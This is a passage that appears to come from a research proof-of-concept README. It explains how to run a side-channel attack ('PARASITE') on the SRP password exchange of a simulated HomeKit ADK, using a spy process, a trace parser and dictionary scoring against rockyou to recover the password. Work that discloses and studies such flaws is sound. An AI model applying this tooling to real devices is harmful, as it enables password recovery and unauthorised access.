## Run the PoC

Build and run container :
```
docker build --rm -t parasite_adk .
docker run --mount type=bind,source="$(pwd)"/shared_folder,target=/PoC_PARASITE/shared_folder -it parasite_adk
```

Run PoC :
```bash
# Launch the SRP simulation along with the spy process to acquire some traces
./poc.sh
# Interpret the execution trace generated by the spy process to extract information
trace_parser.py traces_admin_password_0102030405060708090A0B0C0D0E0F10/* > infos.txt
# Given the extracted information, compute a matching score for all passwords in the dictionary. The lower the score, the higher the chance we found the correct password
for info in $(cat infos.txt | grep -v "Error");
do
    dict_reducer /usr/share/dict/rockyou.txt $info
done
```

The first step may be an issue on different CPU. Namely, we add issue reproducing the attack on different station, where only the end of the exponentiation was caught by the spy, which we can't currently explain. You may can to run the parsing and reduction on the data we collected on our station to get reliable results.
The data are available in shared_folder.
To do so, simply run:
```bash
trace_parser.py shared_folder/traces_admin_password_0102030405060708090A0B0C0D0E0F10/* > infos.txt
for info in $(cat infos.txt | grep -v "Error");
do
    dict_reducer /usr/share/dict/rockyou.txt $info
done
```

# Using HomeKit PoC with non default parameters
Currently the id, password and salt are directly written in the code of the HomeKit ADK simulator and use the default values (admin, password, 0102030405060708090A0B0C0D0E0F10). To test the PoC with other parameters the source code of the simulator need to be changed and recompiled.
The source code can be changed at HomeKitADK/Applications/ADKSimulator/main.c. It can be easily recompiled by rebuilding the container.

Then when using the PoC you can specify the values (salt must be 16 bytes long):
```
./poc.h -u user -p pwd -s 000102030405060708090A0B0C0D0E0F
```
